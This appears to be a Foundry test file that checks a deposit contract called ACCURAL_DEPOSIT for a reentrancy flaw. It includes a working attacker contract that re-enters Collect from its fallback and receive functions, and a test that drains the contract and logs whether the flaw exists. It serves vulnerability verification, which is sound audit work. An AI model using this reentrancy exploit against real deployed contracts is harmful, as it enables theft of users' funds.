// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4320e6f8c05b27ab4707cd1f6d5ce6f3e4b3a5a1.sol";

contract LogFileMock {
    function AddMessage(address _adr, uint _val, string memory _data) public {
        // Mock implementation that does nothing
    }
}

contract MaliciousContract {
    ACCURAL_DEPOSIT public target;
    uint public attackCount;
    uint public attackAmount;

    constructor(address payable _target) {
        target = ACCURAL_DEPOSIT(_target);
    }

    function deposit() external payable {
        target.Deposit{value: msg.value}();
    }

    function initiateAttack(uint _amount) external {
        attackAmount = _amount;
        target.Collect(_amount);
    }

    fallback() external payable {
        if (address(target).balance >= attackAmount && attackCount < 2) {
            attackCount++;
            target.Collect(attackAmount);
        }
    }

    receive() external payable {
        if (address(target).balance >= attackAmount && attackCount < 2) {
            attackCount++;
            target.Collect(attackAmount);
        }
    }
}

contract ACCURAL_DEPOSITTest is Test {
    ACCURAL_DEPOSIT public depositContract;
    LogFileMock public logFile;
    MaliciousContract public attacker;
    address public owner = makeAddr("owner");
    address public user = makeAddr("user");

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(user, 10 ether);

        // Deploy mock LogFile
        logFile = new LogFileMock();

        vm.prank(owner);
        depositContract = new ACCURAL_DEPOSIT();

        // Set up required contracts before initialization
        vm.prank(owner);
        depositContract.SetLogFile(address(logFile));

        vm.prank(owner);
        depositContract.SetMinSum(1 ether);

        vm.prank(owner);
        depositContract.Initialized();

        attacker = new MaliciousContract(payable(address(depositContract)));
        vm.deal(address(attacker), 10 ether);
    }

    function testReentrancyAttack() public {
        // Attacker deposits 2 ether
        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}();

        // Capture state before attack
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 contractBalanceBefore = address(depositContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerInternalBalanceBefore = depositContract.balances(address(attacker));
        
        console.log("Contract ETH balance:", contractBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Attacker internal balance:", attackerInternalBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Perform reentrancy attack
        vm.prank(address(attacker));
        attacker.initiateAttack(1 ether);

        // Capture state after attack
        console.log("--- AFTER-Trigger Attack ---");
        uint256 contractBalanceAfter = address(depositContract).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerInternalBalanceAfter = depositContract.balances(address(attacker));

        console.log("Contract ETH balance:", contractBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Attacker internal balance:", attackerInternalBalanceAfter);

        // Verify attacker drained funds
        assertEq(address(depositContract).balance, 0);
        assertEq(address(attacker).balance, 10 ether); // Got back all funds plus extra

        // Vulnerability verification based on state changes
        if (contractBalanceAfter == 0 && attackerBalanceAfter == 10 ether) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded - contract drained");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed");
        }
    }

    function testNormalWithdrawal() public {
        // Normal user deposits 1 ether
        vm.prank(user);
        depositContract.Deposit{value: 1 ether}();

        // Check initial balances
        assertEq(address(depositContract).balance, 1 ether);
        assertEq(user.balance, 9 ether);

        // Normal withdrawal
        vm.prank(user);
        depositContract.Collect(1 ether);

        // Verify balances updated correctly
        assertEq(address(depositContract).balance, 0);
        assertEq(user.balance, 10 ether);
    }
}